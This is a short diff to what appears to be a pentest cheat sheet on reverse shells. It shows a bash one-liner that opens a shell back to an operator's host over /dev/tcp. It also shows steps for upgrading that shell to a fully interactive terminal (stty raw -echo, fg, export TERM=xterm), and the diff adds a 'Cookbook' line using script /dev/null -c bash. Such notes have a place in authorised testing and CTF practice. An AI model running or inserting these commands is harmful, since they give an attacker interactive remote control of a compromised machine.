@@ -5,7 +5,6 @@
 	bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1"
 
 
-
 ## Fully interactive shell
 
 In the reverse shell write
@@ -18,3 +17,10 @@ Put nc in the background
 	stty raw -echo
 	fg
 	export TERM=xterm
+
+
+## Cookbook
+
+Ugrading the the reverse shell we got
+
+	script /dev/null -c bash
